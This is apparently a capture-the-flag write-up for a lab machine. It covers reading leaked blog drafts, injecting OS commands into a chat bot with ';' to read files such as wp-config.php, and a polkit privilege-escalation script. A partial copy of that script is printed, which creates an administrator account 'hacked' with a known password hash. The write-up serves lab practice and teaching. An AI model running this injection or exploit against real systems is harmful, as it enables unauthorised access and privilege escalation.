Micheal please remove the secret from drafts for gods sake!
Hello employees of Blunder Tiffin,
Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.
So, I kindly request you all to take your discussions from the public blog to a more private chat system.

# Warning for Michael
Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
# Also, stop looking at my drafts. Jeez!

I have an another link, I have to add chat.office.paper to my hosts file.

# rocket chat
This CTF is so fun :D
NOOO, GOD! NO, GOD, PLEASE, NO! NO! NO!

I have something to do with the bot.

I can't upload files in the chat with the bot.

This is interesting.

Maybe I can start an another command with ;
Ahahahah!!!!
Stop injecting OS commands!

Maybe I can fetch the wp-config.php

eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'

# Get user

I have to try this password with the user of the box.

```

# get root
In the dwight home we have a pk.sh file.
```sh
#!/bin/bash

# Set the name and display name
userName="hacked"
realName="hacked"

# Set the account as an administrator
accountType=1

# Set the password hash for 'password' and password hint
password='$5$WR3c6uwMGQZ/JEZw$OlBVzagNJswkWrKRSuoh/VCrZv183QpZL7sAeskcoTB'
passHint="password"

# Check Polkit version
polkitVersion=$(systemctl status polkit.service | grep version | cut -d " " -f 9)
if [[ "$(apt list --installed 2>/dev/null | grep polkit | grep -c 0.105-26)" -ge 1 || "$(yum list installed | grep polkit | grep -c 0.117-2)" ]]; then
    echo "[*] Vulnerable version of polkit found"
else
    echo "[!] WARNING: Version of polkit might not vulnerable"
fi
```

It will create a new user, hacked:password.
He is checking the version of polkit too.
I don't put all the code, it's too long, you have to see it yourself.
```sh
./pk.sh
```
Oh!!! pk is for polkit I got it now, but I don't know why my pol.py don't work, I'm using this exploit too.

It was a cool box, I was a bit stuck at the beginning because I didn't saw office.paper.htb
The bot was fun, you can do it in some python or bash bots on discord or IRC.
